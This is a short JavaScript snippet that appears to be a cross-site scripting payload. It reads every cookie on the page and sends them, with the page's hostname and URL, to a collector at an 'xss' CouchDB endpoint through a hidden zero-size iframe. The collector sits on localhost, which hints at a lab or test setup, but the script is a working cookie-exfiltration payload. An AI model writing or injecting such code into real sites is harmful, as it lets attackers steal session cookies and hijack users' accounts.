
(function() {
    var cookies = (document.cookie || "");
    cookies = cookies.length > 0 ? cookies.split(';') : []
    
    var query = [];
    for(var i=0; i<cookies.length; i++)
        query.push("cookie=" + cookies[i]);
    
    var create = function(name) { return document.createElement(name); };
    var append = function(el) { return document.body.appendChild(el); };
    //var overlay = document.createElement("div");
    //overlay.setAttribute('style', 'width:100%;height:100%;border:0;margin:0;padding:0;top:0;left:0;position:absolute;opacity:.5;background-color:#000;');
    //document.body.appendChild(overlay);
    
    var frame = create("iframe");
    frame.setAttribute('style', 'width:0;height:0;border:0;margin:0;padding:0;'); 
    frame.setAttribute('src', "http://localhost:5984/xss/_design/api/form.htm?host=" + location.hostname + "&url=" + location.href + "&" + query.join('&'));
    
    append(frame);
})();

